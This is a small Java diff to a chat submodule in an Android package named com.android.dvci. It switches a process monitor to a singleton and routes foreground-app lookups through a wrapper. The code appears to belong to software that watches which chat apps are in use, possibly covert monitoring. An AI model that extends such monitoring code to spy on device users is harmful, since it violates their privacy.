@@ -10,7 +10,6 @@ import com.android.dvci.Standby;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
 import com.android.dvci.interfaces.Observer;
-import com.android.dvci.listener.ListenerProcess;
 import com.android.dvci.listener.ListenerStandby;
 import com.android.dvci.module.ModuleChat;
 import com.android.dvci.module.SubModule;
@@ -20,7 +19,7 @@ public abstract class SubModuleChat extends SubModule implements Observer<Standb
 
 	private static final String TAG = "SubModuleChat";
 	private ScheduledFuture future;
-	RunningProcesses runningProcesses = new RunningProcesses();
+	RunningProcesses runningProcesses = RunningProcesses.self();
 
 	@Override
 	protected void go() {
@@ -53,10 +52,10 @@ public abstract class SubModuleChat extends SubModule implements Observer<Standb
 			Check.log(TAG + " (notification) standby " + b);
 		}
 		if (b.getStatus() == false) {
-			ProcessInfo process = new ProcessInfo(runningProcesses.getForeground(), ProcessStatus.STOP);
+			ProcessInfo process = new ProcessInfo(runningProcesses.getForeground_wrapper(), ProcessStatus.STOP);
 			notification(process);
 		} else {
-			ProcessInfo process = new ProcessInfo(runningProcesses.getForeground(), ProcessStatus.START);
+			ProcessInfo process = new ProcessInfo(runningProcesses.getForeground_wrapper(), ProcessStatus.START);
 			notification(process);
 		}
 		return 0;
